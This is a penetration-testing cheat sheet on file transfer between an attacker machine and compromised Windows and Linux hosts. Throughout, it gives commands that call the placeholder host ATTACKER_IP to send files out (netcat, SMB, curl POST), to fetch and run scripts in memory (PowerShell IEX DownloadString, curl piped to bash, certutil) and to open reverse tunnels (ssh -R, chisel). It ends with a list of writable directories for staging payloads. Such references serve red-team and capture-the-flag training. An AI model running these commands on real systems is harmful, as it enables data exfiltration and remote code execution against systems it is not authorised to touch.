# File Transfer

## HTTP Servers (Attacker)

Start one of these before serving files:

```bash
python3 -m http.server 80
php -S 0.0.0.0:80
updog -p 80  # pip3 install updog — supports uploads
```

---

## Windows to Attacker

### SMB (most reliable, no AV issues)
```bash
# On attacker
impacket-smbserver share $(pwd) -smb2support -user hacker -password HACKER123!

# On Windows
net use \\ATTACKER_IP\share /user:hacker HACKER123!
copy C:\path\to\file.exe \\ATTACKER_IP\share\
net use /d \\ATTACKER_IP\share
```

### PowerShell Base64 (no outbound connections needed)
```powershell
# On Windows — encode
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file.exe")) | Out-File -Encoding ASCII file.b64

# On attacker — decode
base64 -d file.b64 > file.exe
```

### Netcat
```bash
# On attacker
nc -nlvp 4444 > received_file.exe

# On Windows
nc ATTACKER_IP 4444 < C:\path\to\file.exe
```

---

## Attacker to Windows

### PowerShell (preferred)
```powershell
# IWR (PowerShell 3.0+)
powershell -c "IWR -Uri http://ATTACKER_IP/file.exe -OutFile C:\temp\file.exe"

# In-memory execution
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"
```

### Certutil
```cmd
certutil -urlcache -f http://ATTACKER_IP/file.exe C:\temp\file.exe
```

### SMB
```bash
# On attacker
impacket-smbserver share $(pwd) -smb2support

# On Windows
copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
```

---

## Linux to Attacker

### SCP (if SSH available)
```bash
scp /path/to/file user@ATTACKER_IP:/path/to/destination
```

### Netcat
```bash
# On attacker
nc -nlvp 4444 > received_file

# On Linux
nc ATTACKER_IP 4444 < /path/to/file
```

### Curl POST
```bash
curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:4444
```

---

## Attacker to Linux

### Wget / Curl (preferred)
```bash
wget http://ATTACKER_IP/file -O /tmp/file
curl http://ATTACKER_IP/file -o /tmp/file

# In-memory execution
curl http://ATTACKER_IP/script.sh | bash
```

### SCP
```bash
scp user@ATTACKER_IP:/path/to/file /tmp/file
```

### Netcat
```bash
# On attacker
nc -nlvp 4444 < file

# On Linux
nc ATTACKER_IP 4444 > /tmp/file
```

---

## Tunnels (when direct transfer is blocked)

### SSH Reverse Tunnel
```bash
# On target
ssh -R 8080:localhost:80 user@ATTACKER_IP

# On attacker
wget http://localhost:8080/file
```

### Chisel Reverse Tunnel
```bash
# On attacker
./chisel server -p 8000 --reverse

# On target
./chisel client ATTACKER_IP:8000 R:8080:localhost:80

# On attacker
wget http://localhost:8080/file
```

---

## Common Upload Directories

**Windows**
```
C:\Windows\Temp
C:\Temp
C:\Users\Public
C:\Users\<username>\AppData\Local\Temp
C:\inetpub\wwwroot   # If IIS
C:\xampp\htdocs      # If XAMPP
```

**Linux**
```
/tmp
/var/tmp
/dev/shm
/home/<user>
/var/www/html        # If web server
```
